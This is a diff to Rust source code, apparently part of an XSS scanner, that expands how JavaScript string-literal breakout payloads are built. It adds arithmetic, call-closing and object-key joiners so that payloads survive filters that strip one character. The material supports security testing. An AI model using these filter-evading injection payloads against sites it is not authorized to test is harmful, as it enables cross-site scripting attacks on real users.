@@ -275,23 +275,38 @@ pub(crate) fn get_js_breakout_payloads() -> Vec<String> {
     }
     payloads
 }
-/// String-literal breakouts (`'-alert(1)-'`) for a JS reflection whose quote
-/// delimiter is known. Empty when it is not: the unquoted forms are already
-/// covered by [`get_jsonp_callback_payloads`].
+/// String-literal breakouts for a JS reflection whose quote delimiter is
+/// known. Empty when it is not: the unquoted forms are already covered by
+/// [`get_jsonp_callback_payloads`].
+///
+/// Several joiners, because a filter that strips one (`-`) leaves the others:
+/// arithmetic (`'-X-'`, `'+X+'`, `'*X*'`), closing the call and commenting out
+/// the rest (`');X//`), and the object-key position (`go({'Q':1})` →
+/// `':X,'`). Primitive-major order puts every joiner's `alert(1)` first.
 pub(crate) fn get_js_expression_breakout_payloads(
     delim: Option<&crate::parameter_analysis::DelimiterType>,
 ) -> Vec<String> {
     use crate::parameter_analysis::DelimiterType;
-    let wrap: fn(&str) -> String = match delim {
-        Some(DelimiterType::SingleQuote) => |js| format!("'-{js}-'"),
-        Some(DelimiterType::DoubleQuote) => |js| format!("\"-{js}-\""),
-        Some(DelimiterType::Backtick) => |js| format!("${{{js}}}"),
+    let q = match delim {
+        Some(DelimiterType::SingleQuote) => '\'',
+        Some(DelimiterType::DoubleQuote) => '"',
+        Some(DelimiterType::Backtick) => {
+            return crate::payload::XSS_JAVASCRIPT_PAYLOADS_SMALL
+                .iter()
+                .map(|js| format!("${{{js}}}"))
+                .collect();
+        }
         _ => return Vec::new(),
     };
-    crate::payload::XSS_JAVASCRIPT_PAYLOADS_SMALL
-        .iter()
-        .map(|js| wrap(js))
-        .collect()
+    let mut out = Vec::new();
+    for js in crate::payload::XSS_JAVASCRIPT_PAYLOADS_SMALL {
+        out.push(format!("{q}-{js}-{q}"));
+        out.push(format!("{q}+{js}+{q}"));
+        out.push(format!("{q}*{js}*{q}"));
+        out.push(format!("{q});{js}//"));
+        out.push(format!("{q}:{js},{q}"));
+    }
+    out
 }
 /// JSONP-callback payloads: reflected as the *callable identifier* of a
 /// `application/javascript` (JSONP) response — `callback=…` echoed into
